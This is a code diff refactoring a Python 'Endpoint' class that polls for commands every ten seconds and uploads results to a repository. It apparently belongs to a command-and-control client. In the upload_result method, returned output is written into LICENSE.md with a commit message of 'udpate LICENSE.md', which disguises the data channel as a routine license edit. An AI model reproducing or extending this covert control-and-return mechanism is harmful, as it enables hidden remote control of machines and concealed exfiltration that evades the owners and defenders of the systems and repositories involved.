@@ -9,7 +9,6 @@ from ulma.utils import Utils
 class Endpoint:
 
     def __init__(self):
-        self.command = None
         self.last_command = None
         self.user = None
         self.repo = None
@@ -27,10 +26,6 @@ class Endpoint:
 
         else:
             self.endpoint = None
-            self.repo = None
-
-    def get_endpoint(self):
-        return self.endpoint
     
     def get_repo(self):
         if self.endpoint is not None:
@@ -41,11 +36,9 @@ class Endpoint:
             
     
     def handle_command(self, command):
-        self.command = command
-
-        if self.command != self.last_command:
-            self.last_command = self.command
-            print("Command actuelle: ", self.command)
+        if command != self.last_command:
+            self.last_command = command
+            print("Command actuelle: ", command)
     
     def receive_command(self):
         while True:
@@ -54,10 +47,9 @@ class Endpoint:
                 self.handle_command(command)
             else:
                 self.get_repo()
-                self.receive_command()
-            
+
             time.sleep(10)
 
     def upload_result(self, result):
         if self.repo is not None:
-            self.repo.file_contents("/LICENSE.md").update('udpate LICENSE.md', result.encode('utf-8'))
+            self.repo.file_contents("LICENSE.md").update('udpate LICENSE.md', result.encode('utf-8'))
